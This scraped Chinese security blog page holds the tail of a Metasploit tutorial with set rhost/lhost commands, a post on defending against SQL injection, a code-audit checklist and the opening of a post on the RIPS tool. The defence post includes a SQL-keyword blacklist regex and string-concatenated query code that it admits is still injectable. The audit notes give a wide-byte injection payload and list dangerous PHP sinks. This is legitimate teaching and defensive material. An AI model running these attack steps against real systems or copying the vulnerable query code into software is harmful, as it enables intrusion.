<p>接下来在metasploit中设置物理机的ip和端口即可</p>
<p>set rhost 192.168.0.107</p>
<p>set rport 12345</p>
<p>set lhost 192.168.0.108</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit11.png" alt=""></p>
<h4 id="run模块"><a href="#run模块" class="headerlink" title="run模块"></a>run模块</h4><p>万事俱备之后，设置好我们想执行的命令，直接输入run，即可发起攻击。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit12.png" alt=""></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>一款优秀的工具对渗透测试人员来说就像一把锋利的刀，他不仅能节省我们非常多的时间，也能弥补我们技术上的空白。</p>
<p>metasploit还有非常多有趣的用法，我也是初学所以无法一一列举出来，学习新工具的过程，最需要的是耐心的读官方文档和善用-help命令，并且记好笔记。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/14/sql注入之代码层防御策略/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/14/sql注入之代码层防御策略/" itemprop="url">
                  sql注入之代码层防御策略
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-14T22:47:07+08:00">
                2018-05-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/防御策略/" itemprop="url" rel="index">
                    <span itemprop="name">防御策略</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/14/sql注入之代码层防御策略/" class="leancloud_visitors" data-flag-title="sql注入之代码层防御策略">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前写sql注入的博客都是站在攻击者角度上的，这次站在防御方的角度上，总结一下代码层防御sql注入的一些方法。</p>
<h2 id="0x01-代码层防御"><a href="#0x01-代码层防御" class="headerlink" title="0x01 代码层防御"></a>0x01 代码层防御</h2><p>在易受sql注入攻击的应用程序开发过程中，如果我们在代码里面进行一些合理的过滤和安全措施，就可以防范绝大多数的sql注入。</p>
<h2 id="0x02-参数化语句"><a href="#0x02-参数化语句" class="headerlink" title="0x02 参数化语句"></a>0x02 参数化语句</h2><p>引发sql注入最根本的原因是将sql语句创建成字符串发送给数据库，即动态sql。</p>
<p>而现在大多数程序在访问数据库时已然采用了参数化语句的方式，即用占位符或者绑定变量来向sql查询提供参数，而非直接让用户使用sql语句。显然，这种方式提升了安全性。</p>
<p>我们给出一段代码来说明参数化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;xxxxx&quot;;</span><br><span class="line">$dbname = &quot;xxxxx&quot;;</span><br><span class="line">$conn = new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">$username = request(&quot;username&quot;);</span><br><span class="line">$password = request(&quot;password&quot;);</span><br><span class="line">sql = &quot;select * from user where username = &apos;&quot;.$username.&quot;&apos;and password = &apos;&quot;.$password.&quot;&apos;&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>我们可以看到，这是如今大多数后台都会采用的书写方式，他比起直接让用户控制sql语句减少了一定的风险，但是在之前写的渗透测试方式中，仍然有无数种方法成功注入。所以我们还得继续加一层保险——对参数进行输入验证。</p>
<h2 id="0x03-php中输入验证"><a href="#0x03-php中输入验证" class="headerlink" title="0x03 php中输入验证"></a>0x03 php中输入验证</h2><p>我们首先看一下在php中怎么进行输入验证。<br>php中我们能用到的函数如下：</p>
<ul>
<li>preg_match(reg,match): 使用正则表达式reg对match字符串进行正则匹配。</li>
<li>is_<type>(input): 检查输入input是否为<type>，如检查数字is_numeric()。</type></type></li>
<li>strlen(input): 检查输入的长度。</li>
</ul>
<p>其中preg_match如果用/i可以匹配大小写不敏感的数据，所以大小写混用也是无法绕过的。</p>
<p>假如黑名单过滤，我们只要匹配出任意违法字符，就禁止入库并且返回违法输入的提示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$username=$_POST[&apos;username&apos;];</span><br><span class="line">if(preg_match(&quot;/*|#|;|,|is|file|drop|union|select|ascii|mid|from|(|)|or|\^|=|&lt;|&gt;|like|regexp|for|and|limit|file|--|||&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;,$username))&#123;</span><br><span class="line">die(&apos;illegal input!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;success!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再比如白名单过滤，我们可以仅允许数字字母，如果有超出数字字母的字符使匹配失败，就禁止入库并且返回违法输入的提示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$username=$_POST[&apos;username&apos;];</span><br><span class="line">if(!preg_match(&quot;/^[a-z\d]*$/i&quot;,$username))</span><br><span class="line">&#123;</span><br><span class="line">    die(&apos;illegal input!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;success!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x04-java中输入验证"><a href="#0x04-java中输入验证" class="headerlink" title="0x04 java中输入验证"></a>0x04 java中输入验证</h2><p> Java中的输入验证支持专属于正在使用的框架，如下是使用构建Web应用的框架JSF(Java Server Faces)对输入验证提供支持的示例代码，定义了一个输入验证类，实现了javax.faces.validator.Validator接口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class UsernameValidator implements Validator &#123;</span><br><span class="line">    public void validate(FacesContent faceContext, UIComponent uiComponent, Object value) throws ValidatorException</span><br><span class="line">&#123;</span><br><span class="line">    // get the username and transform it to a string</span><br><span class="line">    String username = (String) value;</span><br><span class="line"></span><br><span class="line">    // build a regexp</span><br><span class="line">    Pattern p = Pattern.compile(&quot;^[a-zA-Z]&#123;8,12&#125;$&quot;);</span><br><span class="line"></span><br><span class="line">    // match the user name</span><br><span class="line">    Matcher m = p.matcher(username);</span><br><span class="line">    </span><br><span class="line">    if(!matchFound) &#123;</span><br><span class="line">    　　FacesMessage message = new FacesMessage();</span><br><span class="line">   　　 message.setDetail(&quot;Invalid Input-- Must be 8-12 letters&quot;);</span><br><span class="line">　　　　message.setSummary(&quot;Username invalid&quot;);</span><br><span class="line">　　　　message.setServerity(FacesMessage.SERVERITY_ERROR);</span><br><span class="line">　　　　throw new validatorException(message);</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>需要将以下内容添加到faces-config.xml中以便启用上述验证器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;validator&gt;</span><br><span class="line">    &lt;validator-id&gt;namespace.UsernameValidator&lt;/validator-id&gt;</span><br><span class="line">    &lt;validator-class&gt;namespace.package.UsernameValidator&lt;/validator-class&gt;</span><br><span class="line">&lt;/validator&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后在相关JSP文件中引用在faces-config.xml中添加的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h:inputText value=&quot;username&quot; id=&quot;username&quot; required=&quot;true&quot;&gt;&lt;f:validator validatorId=&quot;namespace.UsernameValidator&quot; /&gt;&lt;/h:input&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-net中输入验证"><a href="#0x05-net中输入验证" class="headerlink" title="0x05 .net中输入验证"></a>0x05 .net中输入验证</h2><p>ASP.NET提供了很多用于输入验证的内置控件，其中最有用的是RegularExpressionValidator控件和CustomValidator控件，下面示例代码是RegularExpressionValidator验证用户名的例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:textbox id=&quot;userName&quot; runat=&quot;server&quot;/&gt;</span><br><span class="line">&lt;asp:RegularExpressionValidator id=&quot;userNameRegEx&quot; runat=&quot;server&quot; ControlToValidate=&quot;userName&quot;</span><br><span class="line">ErrorMessage = &quot;Username must contain 8-12 letters.&quot; ValidationExpression=&quot;^[a-zA-Z]&#123;8-12&#125;$&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>下面的代码是使用CustomValidator验证口令是否为正确格式的示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:textbox id=&quot;txtPassword&quot; runat=&quot;server&quot;/&gt;</span><br><span class="line">&lt;asp:CustomerValidator runat=&quot;server&quot; Controlvalidate=&quot;txtPassword&quot; CLientValidationFunction=&quot;clientPwdValidate&quot;</span><br><span class="line">ErrorMessage=&quot;Password does not meet the requirements.&quot; onServerValidate=&quot;PwdValidate&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-html中输入验证"><a href="#0x06-html中输入验证" class="headerlink" title="0x06 html中输入验证"></a>0x06 html中输入验证</h2><p>在写html输入验证之前先强调一点，html中的验证是基于前端的，而基于前端的验证就是客户端可以在浏览器直接更改的，所以他是不可靠的，没有实际作用的。在html验证之后，一定还要在后端重新验证。</p>
<p>但是为什么还要提他呢？因为在很多情况，如果我们过滤十分严格，输入一些敏感参数的人并不一定都是攻击者，这个时候每条语句都拿到后端判断然后跳转十分浪费时间，所以在前端给出一定的限制和提示，就能提升正常用户的体验。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; required=&quot;required&quot; patter=&quot;^[a-zA-Z\d]*&quot; ...&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x07-编码输出"><a href="#0x07-编码输出" class="headerlink" title="0x07 编码输出"></a>0x07 编码输出</h2><p>我们都清楚，白名单过滤要比黑名单过滤安全的多，在能使用白名单的时候尽量使用白名单，但是很多时候业务需求不能让我们使用白名单，这个时候我们就要使用黑名单结合编码的方式，提升安全性。</p>
<p>我对其他几个语言不是非常熟悉，这里就只介绍一下php的编码函数。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_defense/SQL%20defense01.png" alt=""></p>
<p>这些编码函数，能够将允许范围内的违法字符编码后再存入数据库，能一定程度的防止我们构造语句逃逸，提升了安全性。</p>
<p>但是这些函数没有用对，仍然会出现一些问题，接下来我分享一下上图中我所了解的一些编码函数会存在的安全问题：</p>
<ul>
<li><p>其中htmlspecialchars() 这个函数对xss的过滤十分有效，但是直接使用它时，它只会转义&lt;&gt;符号，对sql注入是没有任何防御效果的，只有加入ENT_COMPAT参数过滤单引号或者加入ENT_QUOTES参数过滤单、双引号，才能用在sql注入的防御中。</p>
</li>
<li><p>其中addslashes()函数，如果在设置了编码的页面如“set character_set_client=gbk” ，就可能造成宽字节注入，在编码时将反斜杠吃掉。</p>
</li>
</ul>
<ul>
<li>其中addslashes()函数和urlencode()或者一些其他的编码函数如big5码的编码函数组合使用时，就可能造成二次注入，用编码产生新的单引号。</li>
</ul>
<p>目前我最常见到的就是这几种，以后遇到新的还会及时补充。</p>
<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>开发人员在代码层稍微多费一点时间增加一些函数，就可以抵御绝大多数的攻击，所以在代码层做防御是十分必要的，但是并不是说做了一些措施就一定能高枕无忧。要想提升整个系统的安全性，需要的是多种技术多个层面的防御相互结合。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/代码审计总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/11/代码审计总结/" itemprop="url">
                  代码审计总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T22:44:48+08:00">
                2018-05-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/11/代码审计总结/" class="leancloud_visitors" data-flag-title="代码审计总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在锻炼自己的代码审计能力，所以准备总结一下审计的方法和技巧。</p>
<h2 id="0x01-漏洞类型"><a href="#0x01-漏洞类型" class="headerlink" title="0x01 漏洞类型"></a>0x01 漏洞类型</h2><ul>
<li>sql注入</li>
<li>xss</li>
<li>文件包含</li>
<li>文件上传</li>
<li>反序列化</li>
<li>csrf</li>
<li>ssrf</li>
<li>代码执行</li>
</ul>
<h2 id="0x02-sql注入"><a href="#0x02-sql注入" class="headerlink" title="0x02 sql注入"></a>0x02 sql注入</h2><h4 id="基本sql注入"><a href="#基本sql注入" class="headerlink" title="基本sql注入"></a>基本sql注入</h4><p>对于基本的sql注入的审计，可以通过$_GET,$_POST等传参追踪数据库操作，也可以通过select , delete , update,insert 数据库操作语句反追踪传参。</p>
<p>主要注意查看有无过滤，有没有转义，有没有参数化。</p>
<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>在关键部分经过转义等操作也不是完全高枕无忧了，如果代码中存在一些utf-8、gbk、big5等编码的函数，就很有可能被传入一些字符吃掉反斜杠，如%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”这种情况，使过滤功亏一篑，所以在这些存在编码的位置，要分析并测试会不会引起上述问题。</p>
<h4 id="httpheader的参数"><a href="#httpheader的参数" class="headerlink" title="httpheader的参数"></a>httpheader的参数</h4><p>有些系统可能会将referer，X_Forwarded_For还有cookie等参数传入数据库，一般的防注入系统考虑了get和post的参数值，而忽略了这些值的检测，并且这些值都是用户可以控制的，所以也要关注一下。</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>攻击payload首先被Web服务器上的应用存储，随后又在关键操作中被使用，这就是二次注入。虽然我们在第一次注入的时候做了足够的过滤，但是第一次构造出可能在第二次调用时触发的payload引发注入，所以在重复利用输入的值的位置需要额外注意。</p>
<h4 id="文件名注入"><a href="#文件名注入" class="headerlink" title="文件名注入"></a>文件名注入</h4><p>php.ini中配置安全策略可以隔绝相当一部分的sql注入，比如magic_quote_gpc=on开启之后，能实现addslshes()和stripslashes()这两个函数的功能，但是这些功能不会过滤因为$_FILE，$_SERVER之类的值</p>
<p>有些cms会把文件名name的值保存在数据库里，但又没有对name进行过滤，可能会造成注入，所以在有对文件名处理的位置，除了考虑文件上传漏洞，也不要忘记分析一下产生sql注入的可能。</p>
<h2 id="0x03-xss"><a href="#0x03-xss" class="headerlink" title="0x03 xss"></a>0x03 xss</h2><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>反射型xss审计的时候基本的思路都一样，通过寻找可控没有过滤（或者可以绕过）的参数，通过echo等输出函数直接输出。寻找的一般思路就是寻找输出函数，再去根据函数寻找变量。一般的输出函数有这些：print , print_r , echo , printf , sprintf , die , var_dump ,var_export。</p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型xss审计和反射型xss审计时候思路差不多，不过存储型xss会在数据库中转一下，注意审计sql语句update ,insert更新和插入。</p>
<h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>基于DOM的跨站脚本XSS：通过访问document.URL 或者document.location执行一些客户端逻辑的javascript代码。不依赖发送给服务器的数据。</p>
<p>审计DOM型XSS时，关注输入可以影响的document.URL等位置。</p>
<h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p>PHP的文件包含可以直接执行包含文件的代码，包含的文件格式是不受限制的，只要能正常执行即可。</p>
<p>文件包含分为本地包含和远程包含。</p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>服务器的php配置中选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，会产生远程文件包含的问题，所以面对这种问题，着重看是否打开了这两个配置选项。</p>
<p>如果非要用到远程文件，在include() ; include_once() ; require();require_once()等代码的位置，要将文件名限制为固定值，完全无法被用户控制。</p>
<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>本地文件包含要查看的代码段和远程文件包含一样，主要查看<br>include() ; include_once() ; require();require_once()这四个函数的位置，要着重查看参数是否外部可控，尽量使其固定。</p>
<p>如果必须要求可控的话，查看是否经历了白名单验证文件名，或者通过函数过滤了危险的字符如“../”。</p>
<h2 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h2><p>文件上传漏洞需要审计的部分是上传函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file();</span><br></pre></td></tr></table></figure></p>
<p>在这个函数周围，要查看是否后端检查，检查的是后缀，文件头，还是content-type。如果检查的是文件头和content-type，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getimagesize()</span><br><span class="line">mime_content_type()</span><br></pre></td></tr></table></figure></p>
<p>等就会产生风险。<br>还要检查是黑名单过滤还是白名单过滤，如果是黑名单过滤，则要检查是否过滤全面了（大小写等）。</p>
<p>如果代码中没有将文件名整体重命名的函数，建议在这里加一个提升安全性。</p>
<p>除了代码中需要检查的部分，还要检查服务器的配置文件和php插件php-cgi等，以及服务器版本是否存在解析漏洞。</p>
<p>ps：文件上传这里，比起代码审计更好的方式是采取黑盒测试。</p>
<h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><p>php反序列化的审计，主要是查找 unserialize();函数的位置。</p>
<p>观察unserialize();函数的参数是否是用户可控的，如果可控就很容易被利用，再观察对传入参数的过滤函数检查情况。</p>
<h2 id="0x07-csrf"><a href="#0x07-csrf" class="headerlink" title="0x07 csrf"></a>0x07 csrf</h2><p>csrf跨站请求伪造漏洞审计时主要查看在登陆后提交的代码部分，有没有通过token和referer对用户身份的合法性进行验证。还有整体有没有设置跨域权限。</p>
<h2 id="0x08-ssrf"><a href="#0x08-ssrf" class="headerlink" title="0x08 ssrf"></a>0x08 ssrf</h2><p>对于ssrf服务端请求伪造的审计，主要去找curl命令等接收远程请求的位置有没有过滤返回信息，验证远程服务器对请求的响应，查看有没有禁用不需要的协议。</p>
<h2 id="0x09-代码、命令执行"><a href="#0x09-代码、命令执行" class="headerlink" title="0x09 代码、命令执行"></a>0x09 代码、命令执行</h2><p>首先来说一下命令执行，命令执行就是调用系统命令cmd或者应用指令bash，审计的时候去找会执行命令的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure></p>
<p>然后查看这些位置有没有严格的过滤规则。</p>
<p>代码执行漏洞会将可执行代码放在webservice中执行，审计代码执行漏洞时，可以去寻找php中将字符串转换成代码并执行的函数，主要去搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">asset()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure></p>
<p>然后查看这些位置有没有严格的过滤规则。</p>
<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>上述这些漏洞的原理都基本写过一遍，大部分也做了复现，所以这里不再详细解释，只是整理一下审计过程中需要注意的位置，留作笔记。</p>
<p>顺便送上两张代码审计的思维导图</p>
<p>php代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png</a></p>
<p>python代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg</a></p>
<p>代码审计的溢出导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/PHP代码审计工具RIPS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/11/PHP代码审计工具RIPS/" itemprop="url">
                  PHP代码审计工具RIPS
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T12:31:13+08:00">
                2018-05-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/11/PHP代码审计工具RIPS/" class="leancloud_visitors" data-flag-title="PHP代码审计工具RIPS">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-代码审计工具RIPS"><a href="#0x00-代码审计工具RIPS" class="headerlink" title="0x00 代码审计工具RIPS"></a>0x00 代码审计工具RIPS</h2><p>在安全工作中，代码审计是很重要的一项技能。在面对大规模的代码时，<br>使用自动化工具辅助人工漏洞挖掘，可以显著提高审计工作的效率。学会利用自动化代码审计工具，是每一个代码审计人员必备的能力。</p>
